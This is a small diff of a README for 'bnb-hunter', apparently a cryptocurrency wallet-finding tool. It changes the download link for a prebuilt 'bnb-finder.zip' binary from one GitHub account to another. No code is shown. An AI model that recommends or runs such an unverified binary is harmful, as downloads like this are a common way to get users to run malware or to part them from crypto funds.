@@ -13,7 +13,7 @@ git clone https://github.com/Topiiiilll/bnb-hunter/
 cd bnb-hunter
 python bnb-finder.py
 ```
-Or you can run it from binary files: https://github.com/Genkai91/bnb-hunter/releases/download/bnb/bnb-finder.zip
+Or you can run it from binary files: https://github.com/Topiiiilll/bnb-hunter/releases/download/bnb/bnb-finder.zip
 
 ![demo](./demo.png)
 
